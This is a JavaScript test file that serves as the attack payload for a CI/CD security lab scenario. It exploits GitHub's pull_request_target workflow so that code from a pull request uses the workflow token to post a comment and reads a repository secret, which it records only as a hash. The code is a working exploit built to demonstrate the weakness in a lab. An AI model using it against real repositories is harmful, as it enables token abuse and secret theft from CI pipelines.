// ATTACK PAYLOAD — scenario 01 (pwn request)
// This file is staged by attacks/01-pwn-request/attack.sh as tests/evil.test.js
// on the attack branch. It is never meant to live on main.
//
// It proves two things when it runs inside the target's vulnerable
// pull_request_target workflow:
//   1. Code from a PR can reach the workflow's GITHUB_TOKEN and use its
//      write permission (it posts a comment on the PR that opened it).
//   2. Code from a PR can read repo secrets available to the job
//      (it hashes DUMMY_CLOUD_KEY and writes proof to the job summary
//      and an uploaded artifact, without printing the raw secret).

const test = require('node:test');
const assert = require('node:assert');
const crypto = require('node:crypto');
const fs = require('node:fs');
const https = require('node:https');

function hash(value) {
  return crypto.createHash('sha256').update(value || '').digest('hex');
}

function githubRequest(pathname, method, body) {
  return new Promise((resolve, reject) => {
    const data = body ? JSON.stringify(body) : undefined;
    const req = https.request(
      {
        hostname: 'api.github.com',
        path: pathname,
        method,
        headers: {
          'User-Agent': 'cicd-compromise-lab-scenario-01',
          Authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
          Accept: 'application/vnd.github+json',
          'Content-Type': 'application/json',
          ...(data ? { 'Content-Length': Buffer.byteLength(data) } : {}),
        },
      },
      (res) => {
        let out = '';
        res.on('data', (chunk) => (out += chunk));
        res.on('end', () => resolve({ status: res.statusCode, body: out }));
      }
    );
    req.on('error', reject);
    if (data) req.write(data);
    req.end();
  });
}

test('pwn-request-01: attacker code runs with workflow token + secret access', async () => {
  const repo = process.env.GITHUB_REPOSITORY; // owner/repo
  const prNumber = process.env.PR_NUMBER;
  const runUrl = `https://github.com/${repo}/actions/runs/${process.env.GITHUB_RUN_ID}`;

  // --- Evidence 1: GITHUB_TOKEN write access, exercised from PR-controlled code ---
  const commentBody = {
    body:
      `**Scenario 01 evidence — pwn request**\n\n` +
      `This comment was posted by test code that shipped inside this PR, ` +
      `executed by the target repo's \`pull_request_target\` workflow at ${runUrl}.\n\n` +
      `It had write access to \`GITHUB_TOKEN\` purely because the PR was opened — ` +
      `no approval, no review, no merge.`,
  };
  const commentResult = await githubRequest(
    `/repos/${repo}/issues/${prNumber}/comments`,
    'POST',
    commentBody
  );

  // --- Evidence 2: secret reachable from PR-controlled code ---
  const secretHash = hash(process.env.DUMMY_CLOUD_KEY);
  const evidence = {
    scenario: '01-pwn-request',
    run_id: process.env.GITHUB_RUN_ID,
    run_url: runUrl,
    pr_number: prNumber,
    github_token_write_test: {
      http_status: commentResult.status,
      proved_write_access: commentResult.status === 201,
    },
    dummy_cloud_key_sha256: secretHash,
    note: 'Raw secret value intentionally never printed or stored, even though it is a dummy value — this mirrors real-world handling.',
  };

  fs.mkdirSync('evidence', { recursive: true });
  fs.writeFileSync('evidence/evidence.json', JSON.stringify(evidence, null, 2));

  if (process.env.GITHUB_STEP_SUMMARY) {
    fs.appendFileSync(
      process.env.GITHUB_STEP_SUMMARY,
      `## Scenario 01 — pwn request: evidence\n\n` +
        '```json\n' +
        JSON.stringify(evidence, null, 2) +
        '\n```\n'
    );
  }

  assert.ok(commentResult.status === 201, 'expected PR comment to post with GITHUB_TOKEN');
  assert.ok(secretHash.length === 64, 'expected DUMMY_CLOUD_KEY to be readable');
});
